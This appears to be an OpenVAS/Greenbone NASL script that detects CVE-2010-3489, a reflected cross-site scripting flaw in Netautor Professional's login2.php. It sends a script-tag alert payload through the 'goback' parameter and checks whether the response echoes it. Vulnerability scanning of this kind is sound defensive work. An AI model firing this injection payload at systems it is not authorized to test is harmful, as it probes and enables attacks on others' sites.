if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902316" );
	script_version( "2021-09-01T09:31:49+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 09:31:49 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2010-10-05 07:29:45 +0200 (Tue, 05 Oct 2010)" );
	script_cve_id( "CVE-2010-3489" );
	script_bugtraq_id( 43290 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_name( "Netautor Professional 'login2.php' Cross Site Scripting Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/41475" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/1009-exploits/ZSL-2010-4964.txt" );
	script_xref( name: "URL", value: "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4964.php" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "insight", value: "The flaw is due to the input passed to the 'goback' parameter in
  'netautor/napro4/home/login2.php' is not properly sanitised before being returned to the user." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Netautor Professional and is prone Cross
  Site Scripting Vulnerability." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to execute
  arbitrary HTML and script code in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "Netautor Professional version 5.5.0 and prior" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
vt_strings = get_vt_strings();
for dir in nasl_make_list_unique( "/netautor", "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	req = http_get( item: dir + "/napro4/index.php", port: port );
	res = http_keepalive_send_recv( port: port, data: req );
	if(ContainsString( res, "<title>Netautor Professional Application Server</title>" )){
		req = http_get( item: NASLString( dir, "/napro4/home/login2.php?goback=\"<script>" + "alert(\"", vt_strings["default"], "\")</script>" ), port: port );
		res = http_keepalive_send_recv( port: port, data: req );
		if(ereg( pattern: "^HTTP/1\\.[01] 200", string: res ) && ContainsString( res, "<script>alert(\"" + vt_strings["default"] + "\")</script>" )){
			security_message( port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

